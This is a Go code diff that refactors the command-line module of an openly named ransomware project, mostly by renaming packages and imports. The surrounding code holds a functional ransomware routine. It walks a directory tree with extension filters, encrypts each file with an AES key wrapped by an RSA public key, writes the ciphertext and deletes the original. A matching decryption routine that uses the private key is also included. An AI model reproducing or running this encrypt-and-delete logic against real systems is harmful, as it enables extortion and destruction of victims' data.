@@ -1,4 +1,4 @@
-package ransomcli
+package cli
 
 import (
 	"bytes"
@@ -6,19 +6,19 @@ import (
 	"encoding/base64"
 	"errors"
 	"fmt"
-	"io/fs"
+	iofs "io/fs"
 	"log"
 	"os"
 	"path/filepath"
 	"strings"
 
 	"github.com/marmos91/ransomware/crypto"
-	"github.com/marmos91/ransomware/ransomfs"
-	"github.com/urfave/cli/v2"
+	"github.com/marmos91/ransomware/fs"
+	urfavecli "github.com/urfave/cli/v2"
 )
 
 func LoadPublicKey(path string) (*rsa.PublicKey, error) {
-	rsaPublicString, err := ransomfs.ReadStringFileContent(path)
+	rsaPublicString, err := fs.ReadStringFileContent(path)
 
 	if err != nil {
 		return nil, err
@@ -34,7 +34,7 @@ func LoadPublicKey(path string) (*rsa.PublicKey, error) {
 }
 
 func LoadPrivateKey(path string) (*rsa.PrivateKey, error) {
-	rsaPrivateString, err := ransomfs.ReadStringFileContent(path)
+	rsaPrivateString, err := fs.ReadStringFileContent(path)
 
 	if err != nil {
 		return nil, err
@@ -49,7 +49,7 @@ func LoadPrivateKey(path string) (*rsa.PrivateKey, error) {
 	return rsaPrivate, nil
 }
 
-func Encrypt(ctx *cli.Context) error {
+func Encrypt(ctx *urfavecli.Context) error {
 	path := ctx.String("path")
 
 	if path == "" {
@@ -104,7 +104,7 @@ func Encrypt(ctx *cli.Context) error {
 	log.Printf("Encrypted key size=%d", len(encryptedAesKey))
 	log.Printf("Encrypted key %s", base64.StdEncoding.EncodeToString(encryptedAesKey))
 
-	return ransomfs.WalkFilesWithExtFilter(absolutePath, extBlacklist, extWhitelist, skipHidden, func(path string, info fs.FileInfo) error {
+	return fs.WalkFilesWithExtFilter(absolutePath, extBlacklist, extWhitelist, skipHidden, func(path string, info iofs.FileInfo) error {
 		err := encryptFile(path, plainAesKey, encryptedAesKey, encSuffix)
 
 		if err != nil {
@@ -113,7 +113,7 @@ func Encrypt(ctx *cli.Context) error {
 
 		if !dryRun {
 			log.Printf("Deleting file %s", path)
-			err := ransomfs.DeleteFile(path)
+			err := fs.DeleteFile(path)
 
 			if err != nil {
 				return err
@@ -124,7 +124,7 @@ func Encrypt(ctx *cli.Context) error {
 	})
 }
 
-func Decrypt(ctx *cli.Context) error {
+func Decrypt(ctx *urfavecli.Context) error {
 	path := ctx.String("path")
 
 	if path == "" {
@@ -161,7 +161,7 @@ func Decrypt(ctx *cli.Context) error {
 
 	log.Printf("Running ransomware tool on %s", absolutePath)
 
-	return ransomfs.WalkFilesWithExtFilter(absolutePath, nil, extWhitelist, false, func(path string, info fs.FileInfo) error {
+	return fs.WalkFilesWithExtFilter(absolutePath, nil, extWhitelist, false, func(path string, info iofs.FileInfo) error {
 
 		err := decryptFile(path, rsaPrivateKey, encSuffix)
 
@@ -172,7 +172,7 @@ func Decrypt(ctx *cli.Context) error {
 		if !dryRun {
 			log.Printf("Deleting file %s", path)
 
-			err := ransomfs.DeleteFile(path)
+			err := fs.DeleteFile(path)
 
 			if err != nil {
 				return err
@@ -200,13 +200,11 @@ func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encS
 		return err
 	}
 
-	log.Printf("Key size %d", len(encryptedAesKey))
-
 	fileContent := append(encryptedAesKey, cipherText...)
 
 	log.Printf("Saving encrypted cipher to %s", newFilePath)
 
-	return ransomfs.WriteStringToFile(newFilePath, string(fileContent))
+	return fs.WriteStringToFile(newFilePath, string(fileContent))
 }
 
 func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) error {
@@ -243,5 +241,5 @@ func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) e
 
 	log.Printf("Saving decrypted cipher to %s", newFilePath)
 
-	return ransomfs.WriteToFile(newFilePath, plaintext)
+	return fs.WriteToFile(newFilePath, plaintext)
 }
